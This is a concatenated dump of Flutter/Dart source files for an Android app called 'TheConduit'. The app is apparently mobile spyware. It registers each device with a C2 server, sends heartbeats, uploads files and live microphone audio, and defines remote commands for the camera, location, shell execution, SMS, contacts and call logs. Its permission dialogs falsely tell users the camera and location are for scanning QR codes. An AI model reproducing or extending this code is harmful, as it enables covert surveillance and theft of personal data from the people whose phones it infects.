      _logger.error(
          "NetworkService:_initializeSocket",
          "Exception during Socket.IO instance creation or event listener setup. Device ID: $deviceIdForConnection",
          e,
          stackTrace);
      _connectionStatusController.add(false); //
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect();
      }
    }
  }

  Future<void> connectSocketIO(String deviceIdToConnectWith) async {
    if (_socket == null || _lastConnectedDeviceId != deviceIdToConnectWith) {
      _logger.info("NetworkService:connectSocketIO",
          "Socket not initialized or deviceId changed. Initializing for $deviceIdToConnectWith.");
      _initializeSocket(deviceIdToConnectWith); //
    }

    if (_socket != null && !_socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Attempting to connect socket for Device ID: $deviceIdToConnectWith...");
      _socket!.connect(); //
    } else if (_socket != null && _socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Socket already connected for Device ID: $deviceIdToConnectWith. SID: ${_socket?.id}");
      if (!_connectionStatusController.isClosed && //
          _connectionStatusController.hasListener) {
        _connectionStatusController.add(true); //
      }
      _startHeartbeat(); //
    } else {
      _logger.error("NetworkService:connectSocketIO",
          "Socket is unexpectedly null after initialization attempt for Device ID: $deviceIdToConnectWith.");
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        //
        _scheduleReconnect(); //
      }
    }
  }

  void _scheduleReconnect() {
    if (_isReconnecting || _lastConnectedDeviceId == null) {
      _logger.info("NetworkService:_scheduleReconnect",
          "Reconnect already in progress or no deviceId to reconnect with. Skipping."); //
      return;
    }
    _isReconnecting = true;
    _reconnectAttempts++;

    _stopReconnectTimer(); //

    final int delaySeconds =
        (_reconnectAttempts * C2_SOCKET_IO_RECONNECT_DELAY.inSeconds)
            .clamp(C2_SOCKET_IO_RECONNECT_DELAY.inSeconds, 60); //

    _logger.info("NetworkService:_scheduleReconnect",
        "Scheduling reconnect attempt #$_reconnectAttempts in $delaySeconds seconds for Device ID: $_lastConnectedDeviceId."); //
    _reconnectTimer = Timer(Duration(seconds: delaySeconds), () {
      //
      if (_lastConnectedDeviceId != null) {
        _logger.info("NetworkService:_scheduleReconnect",
            "Executing reconnect attempt #$_reconnectAttempts for Device ID: $_lastConnectedDeviceId.");
        connectSocketIO(_lastConnectedDeviceId!);
      } else {
        _logger.warn(
            "NetworkService:_scheduleReconnect", //
            "Cannot execute reconnect, _lastConnectedDeviceId is null.");
        _isReconnecting = false;
      }
    });
  }

  void _stopReconnectTimer() {
    _reconnectTimer?.cancel(); //
    _reconnectTimer = null;
  }

  void _startHeartbeat() {
    if (_lastConnectedDeviceId == null) {
      _logger.warn("NetworkService:_startHeartbeat",
          "Cannot start heartbeat, _lastConnectedDeviceId is null."); //
      return;
    }
    _stopHeartbeat();

    _logger.info("NetworkService:_startHeartbeat",
        "Starting heartbeat with interval ${C2_HEARTBEAT_INTERVAL.inSeconds} seconds for Device ID: $_lastConnectedDeviceId."); //
    _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
      //
      if (isSocketConnected && _lastConnectedDeviceId != null) {
        _logger.debug("NetworkService:HeartbeatTimer",
            "Sending heartbeat for Device ID: $_lastConnectedDeviceId.");
        sendHeartbeat({
          'deviceId': _lastConnectedDeviceId!,
          'timestamp': DateTime.now().toIso8601String()
        });
      } else {
        _logger.warn(
            "NetworkService:HeartbeatTimer", //
            "Cannot send heartbeat - socket not connected or no deviceId. Stopping heartbeat. Device ID: $_lastConnectedDeviceId");
        _stopHeartbeat();
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _logger.info("NetworkService:_stopHeartbeat",
          "Stopping heartbeat. Device ID: $_lastConnectedDeviceId"); //
      _heartbeatTimer!.cancel(); //
      _heartbeatTimer = null;
    }
  }

  void disconnectSocketIO() {
    _logger.info("NetworkService:disconnectSocketIO",
        "Disconnecting and disposing Socket.IO. Device ID: $_lastConnectedDeviceId"); //
    _stopHeartbeat();
    _stopReconnectTimer();
    _isReconnecting = false; //

    if (_socket != null) {
      if (_socket!.connected) {
        _socket!.disconnect(); //
      }
      _socket!.dispose(); //
      _socket = null; //
    }
    _logger.info("NetworkService:disconnectSocketIO",
        "Socket.IO resources released for Device ID: $_lastConnectedDeviceId."); //
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfoPayload) {
    if (isSocketConnected) {
      if (!deviceInfoPayload.containsKey('deviceId') ||
          (deviceInfoPayload['deviceId'] as String?)?.isEmpty == true) {
        deviceInfoPayload['deviceId'] = _lastConnectedDeviceId ?? //
            'unknown_fallback_id_in_reg'; //
        _logger.warn("NetworkService:registerDeviceWithC2",
            "deviceId was missing in payload, added: ${deviceInfoPayload['deviceId']}");
      }
      _logger.info(
          "NetworkService:registerDeviceWithC2", //
          "Sending '$SIO_EVENT_REGISTER_DEVICE' with payload for Device ID: ${deviceInfoPayload['deviceId']}. Payload: ${jsonEncode(deviceInfoPayload)}");
      _socket!.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfoPayload); //
    } else {
      _logger.warn(
          "NetworkService:registerDeviceWithC2", //
          "Cannot register device. Socket not connected. Device ID: $_lastConnectedDeviceId");
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        //
        _scheduleReconnect(); //
      }
    }
  }

  void sendHeartbeat(Map<String, dynamic> heartbeatPayload) {
    if (isSocketConnected) {
      _logger.debug("NetworkService:sendHeartbeat",
          "Sending '$SIO_EVENT_DEVICE_HEARTBEAT' for Device ID: ${heartbeatPayload['deviceId']}");
      _socket!.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatPayload); //
    } else {
      _logger.warn(
          "NetworkService:sendHeartbeat", //
          "Cannot send heartbeat. Socket not connected. Device ID: ${heartbeatPayload['deviceId']}");
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    String? commandId,
    required String status,
    dynamic payload,
  }) {
    if (isSocketConnected) {
      final response = {
        'command': originalCommand,
        'command_id': commandId ?? //
            'client_generated_${DateTime.now().millisecondsSinceEpoch}',
        'status': status,
        'payload': payload ?? {}, //
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(), //
        'deviceId': _lastConnectedDeviceId ?? //
            'unknown_id_in_resp'
      };
      _logger.info(
          "NetworkService:sendCommandResponse", //
          "Sending '$SIO_EVENT_COMMAND_RESPONSE' for command '$originalCommand' (ID: ${response['command_id']}) with status '$status'. Device ID: ${response['deviceId']}");
      _socket!.emit(SIO_EVENT_COMMAND_RESPONSE, response); //
    } else {
      _logger.warn(
          "NetworkService:sendCommandResponse", //
          "Cannot send command response for '$originalCommand'. Socket not connected. Device ID: $_lastConnectedDeviceId");
    }
  }

  // New method to send live audio chunks
  void sendLiveAudioChunk(Uint8List audioChunk) {
    if (isSocketConnected && _lastConnectedDeviceId != null) {
      _logger.debug("NetworkService:sendLiveAudioChunk",
          "Sending live audio chunk, size: ${audioChunk.lengthInBytes} bytes for Device ID: $_lastConnectedDeviceId");
      _socket?.emit(SIO_EVENT_LIVE_AUDIO_CHUNK, {
        'deviceId': _lastConnectedDeviceId,
        'chunk':
            audioChunk, // Socket.IO client handles binary data appropriately
        'timestamp': DateTime.now().toUtc().toIso8601String()
      });
    } else {
      _logger.warn("NetworkService:sendLiveAudioChunk",
          "Cannot send audio chunk. Socket not connected or no deviceId.");
    }
  }

  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_INITIAL_DATA); //
    _logger.info(
        "NetworkService:sendInitialData", //
        "Sending initial data to: $url. Device ID from JSON: ${jsonData['deviceId']}");
    try {
      var request = http.MultipartRequest('POST', url); //
      if (!jsonData.containsKey('deviceId') ||
          (jsonData['deviceId'] as String?)?.isEmpty == true) {
        jsonData['deviceId'] =
            _lastConnectedDeviceId ?? 'fallback_initial_id'; //
        _logger.warn(
            "NetworkService:sendInitialData", //
            "deviceId was missing in jsonData, added: ${jsonData['deviceId']}");
      }
      request.fields['json_data'] = jsonEncode(jsonData); //

      if (imageFile != null) {
        _logger.info(
            "NetworkService:sendInitialData", //
            "Attaching initial image file: ${imageFile.name} (Path: ${imageFile.path})");
        final file = File(imageFile.path); //
        if (await file.exists()) {
          request.files.add(await http.MultipartFile.fromPath(
            //
            'image',
            imageFile.path,
            filename: imageFile.name,
          ));
          _logger.info(
              "NetworkService:sendInitialData", //
              "Initial image file '${imageFile.name}' attached successfully.");
        } else {
          _logger.warn(
              "NetworkService:sendInitialData", //
              "Initial image file does NOT exist at path: ${imageFile.path}. Skipping attachment.");
        }
      } else {
        _logger.info(
            "NetworkService:sendInitialData", //
            "No initial image file provided to attach.");
      }

      var response =
          await request.send().timeout(const Duration(seconds: 45)); //
      final responseBody = await response.stream.bytesToString(); //
      _logger.info(
          "NetworkService:sendInitialData", //
          "Server Response Status Code: ${response.statusCode}. Body: $responseBody");
      if (response.statusCode >= 200 && response.statusCode < 300) {
        //
        _logger.info(
            "NetworkService:sendInitialData", //
            "Initial data sent successfully to C2 server.");
        return true; //
      } else {
        _logger.error(
            "NetworkService:sendInitialData", //
            "Failed to send initial data. Status Code: ${response.statusCode}, Body: $responseBody");
        return false; //
      }
    } on TimeoutException catch (e, s) {
      //
      _logger.error("NetworkService:sendInitialData",
          "Timeout sending initial data", e, s);
      return false; //
    } catch (e, s) {
      //
      _logger.error("NetworkService:sendInitialData",
          "Network Error sending initial data", e, s);
      return false; //
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId,
    required String commandRef,
    String? commandId,
    required XFile fileToUpload,
    String fieldName = 'file',
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_COMMAND_FILE); //
    _logger.info(
        "NetworkService:uploadFileFromCommand", //
        "Uploading command file '${fileToUpload.name}' to: $url for Device ID: $deviceId, Command Ref: '$commandRef' (ID: ${commandId ?? "N/A"})");
    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['deviceId'] = deviceId; //
      request.fields['commandRef'] = commandRef; //
      if (commandId != null) {
        //
        request.fields['commandId'] = commandId; //
      }

      _logger.info(
          "NetworkService:uploadFileFromCommand", //
          "Attaching command file: ${fileToUpload.path}, name: ${fileToUpload.name}");
      final file = File(fileToUpload.path); //
      if (await file.exists()) {
        request.files.add(await http.MultipartFile.fromPath(
          //
          fieldName,
          fileToUpload.path,
          filename: fileToUpload.name,
        ));
        _logger.info(
            "NetworkService:uploadFileFromCommand", //
            "Command file '${fileToUpload.name}' attached successfully.");
      } else {
        _logger.error(
            "NetworkService:uploadFileFromCommand", //
            "Command file does NOT exist at path: ${fileToUpload.path}");
        sendCommandResponse(
          //
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            //
            'message':
                'File to upload not found on device at path ${fileToUpload.path}' //
          },
        );
        return false; //
      }

      var response =
          await request.send().timeout(const Duration(seconds: 90)); //
      final responseBody = await response.stream.bytesToString(); //
      _logger.info(
          "NetworkService:uploadFileFromCommand", //
          "Command file upload - Server Response Status Code: ${response.statusCode}. Body: $responseBody");
      if (response.statusCode >= 200 && response.statusCode < 300) {
        //
        _logger.info(
            "NetworkService:uploadFileFromCommand", //
            "Command file '${fileToUpload.name}' uploaded successfully.");

        Map<String, dynamic> serverResponsePayload = {};
        try {
          final decodedBody = jsonDecode(responseBody);
          if (decodedBody is Map<String, dynamic>) {
            serverResponsePayload = decodedBody;
          } else {
            serverResponsePayload = {'raw_response': responseBody};
          }
        } catch (e) {
          _logger.warn("NetworkService:uploadFileFromCommand",
              "Could not decode server JSON response: $responseBody. Error: $e");
          serverResponsePayload = {
            'raw_response': responseBody,
            'decode_error': e.toString()
          };
        }

        sendCommandResponse(
          //
          originalCommand: commandRef,
          commandId: commandId,
          status: 'success',
          payload: {
            //
            'message': 'File ${fileToUpload.name} uploaded successfully to C2.',
            ...serverResponsePayload // Include server's JSON response
          },
        );
        return true; //
      } else {
        _logger.error(
            "NetworkService:uploadFileFromCommand", //
            "Failed to upload command file '${fileToUpload.name}'. Status Code: ${response.statusCode}, Body: $responseBody");
        sendCommandResponse(
          //
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            //
            'message':
                'Failed to upload file ${fileToUpload.name} to C2. Server status: ${response.statusCode}',
            'response_body': responseBody, //
          },
        );
        return false; //
      }
    } on TimeoutException catch (e, s) {
      //
      _logger.error("NetworkService:uploadFileFromCommand",
          "Timeout uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        //
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          //
          'message': 'Timeout uploading file ${fileToUpload.name} to C2.'
        },
      );
      return false; //
    } catch (e, s) {
      //
      _logger.error("NetworkService:uploadFileFromCommand",
          "Network Error uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        //
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          //
          'message':
              'Exception uploading file ${fileToUpload.name} to C2: ${e.toString()}'
        },
      );
      return false; //
    }
  }

  void dispose() {
    _logger.info(
        "NetworkService:dispose", //
        "Disposing NetworkService resources. Device ID: $_lastConnectedDeviceId");
    disconnectSocketIO();
    _connectionStatusController.close(); //
    _commandController.close(); //
    _logger.info(
        "NetworkService:dispose", //
        "All NetworkService resources have been released.");
  }
}



// ------------------------------ نهاية الملف: network_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: permission_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\permission_service.dart
// ----------------------------------------------------------------------

// lib/services/permission_service.dart
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/material.dart';

class PermissionService {
  // قائمة الأذونات المطلوبة
  final List<Permission> _requiredPermissions = [
    Permission.camera,
    Permission
        .locationWhenInUse, // أو locationAlways إذا كانت هناك حاجة حقيقية لذلك
    Permission
        .storage, // ملاحظة: هذا قد يتصرف بشكل مختلف في Android 11+ (Scoped Storage)
    // بدائل لـ storage في Android 13+:
    // Permission.photos, // للوصول لمعرض الصور
    // Permission.manageExternalStorage, // صلاحية قوية جداً ونادرة الاستخدام
  ];

  /// يطلب جميع الأذونات المطلوبة بطريقة متسلسلة.
  /// يعرض حوار توضيحي قبل طلب كل إذن حساس.
  Future<bool> requestRequiredPermissions(BuildContext context) async {
    Map<Permission, PermissionStatus> statuses = {};

    for (var permission in _requiredPermissions) {
      var status = await permission.status;
      if (!status.isGranted) {
        // عرض سبب طلب الإذن للمستخدم (لجعله مقنعاً)
        bool showRationale = await _showPermissionRationale(
          context,
          permission,
        );
        if (!showRationale) {
          // المستخدم رفض عرض التبرير، نفترض أنه لا يريد منح الإذن
          debugPrint("User declined rationale for $permission");
          return false;
        }

        // طلب الإذن الفعلي
        status = await permission.request();
      }
      statuses[permission] = status;
      debugPrint("Permission $permission status: $status");

      // إذا تم رفض الإذن بشكل دائم، لا فائدة من المتابعة
      if (status.isPermanentlyDenied) {
        debugPrint("Permission $permission permanently denied.");
        _showAppSettingsDialog(
          context,
          permission,
        ); // نقترح على المستخدم فتح الإعدادات
        return false;
      }

      // إذا تم رفض أي إذن أساسي، نعتبر العملية فاشلة
      if (!status.isGranted) {
        debugPrint("Permission $permission denied.");
        return false;
      }
    }

    // التحقق النهائي من أن كل شيء تم منحه
    return statuses.values.every((status) => status.isGranted);
  }

  /// يتحقق مما إذا كانت جميع الأذونات المطلوبة ممنوحة بالفعل.
  Future<bool> checkPermissions() async {
    for (var permission in _requiredPermissions) {
      if (!(await permission.status.isGranted)) {
        return false;
      }
    }
    return true;
  }

  /// يعرض رسالة توضيحية للمستخدم قبل طلب إذن حساس.
  Future<bool> _showPermissionRationale(
    BuildContext context,
    Permission permission,
  ) async {
    String title;
    String content;

    switch (permission) {
      case Permission.camera:
        title = 'إذن استخدام الكاميرا';
        content = 'نحتاج للوصول إلى الكاميرا لمسح أكواد QR وتحليلها بدقة.';
        break;
      case Permission.locationWhenInUse:
      case Permission.locationAlways:
        title = 'إذن تحديد الموقع';
        content =
            'يساعدنا تحديد موقعك الجغرافي في تحديد مكان مسح الكود بدقة أكبر، مما قد يكون مفيداً في بعض أنواع الأكواد المرتبطة بمواقع معينة.';
        break;
      case Permission.storage:
        title = 'إذن الوصول للتخزين';
        content =
            'نحتاج إذن الوصول للتخزين لحفظ صور أكواد QR التي تم مسحها أو أي بيانات مرتبطة بها قد ترغب في الاحتفاظ بها.';
        break;
      // أضف حالات أخرى إذا لزم الأمر
      default:
        return true; // لا يوجد تبرير خاص مطلوب
    }

    // التأكد من أن context لا يزال صالحاً قبل عرض الـ Dialog
    if (!context.mounted) return false;

    return await showDialog<bool>(
          context: context,
          barrierDismissible: false, // يجب على المستخدم اتخاذ قرار
          builder:
              (BuildContext dialogContext) => AlertDialog(
                title: Text(title),
                content: Text(content),
                actions: <Widget>[
                  TextButton(
                    child: const Text('لاحقاً'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(false), // المستخدم يرفض الآن
                  ),
                  TextButton(
                    child: const Text('السماح'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(true), // المستخدم يوافق على المتابعة
                  ),
                ],
              ),
        ) ??
        false; // إذا أغلق الحوار بطريقة أخرى، اعتبره رفضاً
  }

  // يعرض حوار يقترح على المستخدم فتح إعدادات التطبيق لتغيير الإذن
  void _showAppSettingsDialog(BuildContext context, Permission permission) {
    if (!context.mounted) return;
    showDialog(
      context: context,
      builder:
          (BuildContext context) => AlertDialog(
            title: Text('الإذن مرفوض نهائياً'),
            content: Text(
              'لقد رفضت إذن ${permission.toString().split('.').last} بشكل دائم. يرجى التوجه إلى إعدادات التطبيق لتفعيله يدوياً إذا أردت استخدام هذه الميزة.',
            ),
            actions: <Widget>[
              TextButton(
                child: const Text('إلغاء'),
                onPressed: () => Navigator.of(context).pop(),
              ),
              TextButton(
                child: const Text('فتح الإعدادات'),
                onPressed: () {
                  openAppSettings(); // تفتح إعدادات التطبيق
                  Navigator.of(context).pop();
                },
              ),
            ],
          ),
    );
  }
}



// ------------------------------ نهاية الملف: permission_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: screenshot_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\screenshot_service.dart
// ----------------------------------------------------------------------

// lib/services/screenshot_service.dart
import 'dart:io';
import 'dart:typed_data';
import 'dart:ui' as ui;

import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:image/image.dart' as img; // <-- إضافة مكتبة image
import 'package:path_provider/path_provider.dart';

class ScreenshotService {
  final GlobalKey screenshotKey;
  final Function(String) onLogEvent;

  ScreenshotService({
    required this.screenshotKey,
    required this.onLogEvent,
  });

  Future<Uint8List?> captureScreenshot({double pixelRatio = 3.0}) async {
    // جعل pixelRatio معاملاً
    try {
      await Future.delayed(const Duration(milliseconds: 200)); // زيادة التأخير

      if (screenshotKey.currentContext == null) {
        onLogEvent('Screenshot Error: GlobalKey context is null.');
        return null;
      }

      RenderRepaintBoundary? boundary = screenshotKey.currentContext
          ?.findRenderObject() as RenderRepaintBoundary?;
      if (boundary == null) {
        onLogEvent('خطأ: لم يتم العثور على RepaintBoundary.');
        return null;
      }

      ui.Image image = await boundary.toImage(pixelRatio: pixelRatio);
      ByteData? byteData = await image.toByteData(
          format: ui.ImageByteFormat.png); // الصور الملتقطة تكون PNG عادة
      image.dispose();

      if (byteData == null) {
        onLogEvent('خطأ: فشل تحويل الصورة إلى بيانات');
        return null;
      }
      onLogEvent('تم التقاط لقطة الشاشة (PNG الخام) بنجاح بدقة $pixelRatio');
      return byteData.buffer.asUint8List();
    } catch (e, stackTrace) {
      onLogEvent('خطأ في التقاط الشاشة: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // دالة جديدة لضغط الصورة
  Future<Uint8List?> compressImage(Uint8List pngBytes,
      {int quality = 75}) async {
    try {
      onLogEvent('Compressing image...');
      img.Image? image = img.decodeImage(pngBytes); // فك تشفير الـ PNG
      if (image == null) {
        onLogEvent('Compression Error: Could not decode PNG bytes.');
        return null;
      }
      // تحويل إلى JPEG مع تحديد الجودة (75 كقيمة افتراضية جيدة)
      List<int> jpgBytes = img.encodeJpg(image, quality: quality);
      onLogEvent(
          'Image compressed to JPEG with quality $quality. Original size: ${pngBytes.lengthInBytes}, Compressed size: ${jpgBytes.length}');
      return Uint8List.fromList(jpgBytes);
    } catch (e, stackTrace) {
      onLogEvent('Compression Error: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // تعديل saveScreenshotToFile ليقبل امتدادًا مختلفًا
  Future<String?> saveScreenshotToFile(Uint8List imageBytes,
      {String extension = 'png'}) async {
    try {
      final directory = await getTemporaryDirectory();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      // استخدام الامتداد المعطى
      final filePath = '${directory.path}/screenshot_$timestamp.$extension';
      final file = File(filePath);
      await file.writeAsBytes(imageBytes);
      onLogEvent('تم حفظ لقطة الشاشة في: $filePath');
      return filePath;
    } catch (e) {
      onLogEvent('خطأ في حفظ لقطة الشاشة: $e');
      return null;
    }
  }

  Future<String?> captureAndSaveScreenshot(
      {double pixelRatio = 3.0,
      bool compress = false,
      int quality = 75,
      String targetExtension = 'png'}) async {
    Uint8List? imageBytes = await captureScreenshot(pixelRatio: pixelRatio);
    if (imageBytes != null) {
      if (compress && targetExtension == 'jpg') {
        final compressedBytes =
            await compressImage(imageBytes, quality: quality);
        if (compressedBytes != null) {
          return await saveScreenshotToFile(compressedBytes, extension: 'jpg');
        } else {
          onLogEvent('Failed to compress image, saving original.');
          return await saveScreenshotToFile(imageBytes,
              extension: 'png'); // حفظ الأصلي إذا فشل الضغط
        }
      }
      return await saveScreenshotToFile(imageBytes, extension: targetExtension);
    }
    return null;
  }

  // ... (captureHighQualityScreenshot, captureLowQualityScreenshot يمكن تعديلها أو إزالتها إذا لم تعد مستخدمة)
}



// ------------------------------ نهاية الملف: screenshot_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: constants.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\constants.dart
// ----------------------------------------------------------------------

// lib/utils/constants.dart

// --- SharedPreferences Keys ---
const String PREF_INITIAL_DATA_SENT = 'initialDataSent';
const String PREF_DEVICE_ID = 'pref_device_id'; //

// --- Background Service Events (Flutter internal) ---
const String BG_SERVICE_EVENT_SEND_INITIAL_DATA = 'sendInitialData'; //
const String BG_SERVICE_EVENT_STOP_SERVICE = 'stopService'; //

// --- Socket.IO C2 Communication Events & Commands ---
// For C2 Registration and Heartbeat
const String SIO_EVENT_REGISTER_DEVICE = 'register_device'; //
const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful'; //
const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat'; //
const String SIO_EVENT_REQUEST_REGISTRATION_INFO =
    'request_registration_info'; //

// Commands from C2 Server to Client
const String SIO_CMD_TAKE_PICTURE = 'command_take_picture'; //
const String SIO_CMD_LIST_FILES = 'command_list_files'; //
const String SIO_CMD_GET_LOCATION = 'command_get_location'; //
const String SIO_CMD_UPLOAD_SPECIFIC_FILE = 'command_upload_specific_file'; //
const String SIO_CMD_EXECUTE_SHELL = 'command_execute_shell'; //

const String SIO_CMD_GET_SMS_LIST = 'command_get_sms_list'; //
const String SIO_CMD_GET_CONTACTS_LIST =
    'command_get_contacts_list'; // Changed from export for consistency
const String SIO_CMD_GET_CALL_LOGS = 'command_get_call_logs'; // New
const String SIO_CMD_RECORD_AUDIO_FIXED =
    'command_record_audio_fixed'; // For existing fixed duration recording
const String SIO_CMD_START_LIVE_AUDIO = 'command_start_live_audio'; //
const String SIO_CMD_STOP_LIVE_AUDIO = 'command_stop_live_audio'; //

// Response from Client to C2 Server
const String SIO_EVENT_COMMAND_RESPONSE = 'command_response'; //
const String SIO_EVENT_LIVE_AUDIO_CHUNK = 'live_audio_chunk'; //

// --- HTTP Endpoints (Reminder, main URL is in app_config.dart) ---
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/upload_initial_data'; //
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/upload_command_file'; //

// --- Other Constants ---
const String APP_NAME = "TheConduit"; // // Updated to match app.dart

// Native Channel Names (ensure they match MainActivity.kt)
const String NATIVE_FILES_CHANNEL = 'com.zeroone.theconduit/files';
const String NATIVE_FEATURES_CHANNEL = 'com.zeroone.theconduit/native_features';
const String NATIVE_LIVE_AUDIO_STREAM_CHANNEL =
    'com.zeroone.theconduit/live_audio_stream';



// ------------------------------ نهاية الملف: constants.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: helpers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\helpers.dart
// ----------------------------------------------------------------------




// ------------------------------ نهاية الملف: helpers.dart ------------------------------
// ======================================================================


################################################################################
# تم بنجاح معالجة واستخراج محتوى 24 ملف/ملفات دارت.
################################################################################
